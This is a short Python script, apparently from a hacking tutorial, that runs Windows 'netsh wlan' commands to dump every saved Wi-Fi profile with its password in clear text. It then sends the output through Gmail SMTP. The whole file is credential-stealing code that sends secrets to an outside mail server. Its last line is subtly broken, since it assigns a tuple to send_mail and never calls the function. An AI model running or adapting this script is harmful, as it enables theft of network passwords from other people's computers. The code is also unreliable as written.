#!/usr/bin/env python

import subprocess, smtplib, re


def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)  # Google's server = smtp.gmail.com
	# Google server port = 587
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)  # sendmail(From, To, Content_of_the_email)
	server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
# '?:' is used for noncapturing group

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profile " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

send_mail =("email_address", "password", result)